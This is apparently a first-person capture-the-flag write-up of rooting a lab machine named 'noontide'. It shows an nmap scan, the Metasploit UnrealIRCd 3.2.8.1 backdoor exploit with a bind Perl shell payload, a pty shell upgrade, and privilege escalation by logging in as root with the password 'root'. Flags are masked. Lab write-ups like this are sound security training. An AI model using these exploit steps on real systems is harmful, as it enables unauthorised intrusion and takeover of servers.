-> I started by scanning the machine using nmap
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -sV -Pn -p- --min-rate 10000 192.168.167.120
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 20:56 EST
Nmap scan report for 192.168.167.120
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd (Admin email example@example.com)
8067/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```
-> I noticied an UnreallRCd, I already knew that msfconsole had an exploit for this, so I got to it
-> Searching for exploits I found an Backdoor Command Execution
```
msf6 > searchsploit UnrealIRCd
[*] exec: searchsploit UnrealIRCd

----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                         | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                              | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                       | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                            | windows/dos/27407.pl
----------------------------------------------------------------------------------------------------- ---------------------------------
```
-> I select the exploit and the payload and run 
```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > use exploit/unix/irc/unreal_ircd_3281_backdoor 
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.167.120
RHOSTS => 192.168.167.120
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set TARGET 0
TARGET => 0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   8   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   9   payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   10  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   11  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 0
payload => cmd/unix/bind_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] 192.168.167.120:6667 - Connected to 192.168.167.120:6667...
    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
[*] 192.168.167.120:6667 - Sending backdoor command...
[*] Started bind TCP handler against 192.168.167.120:4444
[*] Command shell session 1 opened (192.168.45.5:45803 -> 192.168.167.120:4444) at 2023-02-20 21:02:20 -0500
```
-> Now I got access to the machine, and I look for the first flag
```
python -c 'import pty; pty.spawn("/bin/bash")'
server@noontide:~/irc/Unreal3.2$ cd                                                                                                                                                                                                         
cd                                                                                                                                                                                                                                          
server@noontide:~$ ls                                                                                                                                                                                                                       
ls                                                                                                                                                                                                                                          
irc  local.txt                                                                                                                                                                                                                              
server@noontide:~$ cat local.txt                                                                                                                                                                                                            
cat local.txt                                                                                                                                                                                                                               
f*************************************9                                                                                                                                                                                                            
server@noontide:~$ 
```
->  Now we need to escalate privileges. Normally I try root:root login, so I tried a su root and tried the password "root" and I got it. It was way as simple as I thought.
```
server@noontide:~$ su root
su root
Password: root

root@noontide:/home/server# whoami
whoami
root
root@noontide:/home/server#
```
-> Getting the root flag
```
root@noontide:/home/server# cd  
cd 
root@noontide:~# cat proof.txt
cat proof.txt
e**********************************6
root@noontide:~# 
```
-> This was a very easy one!
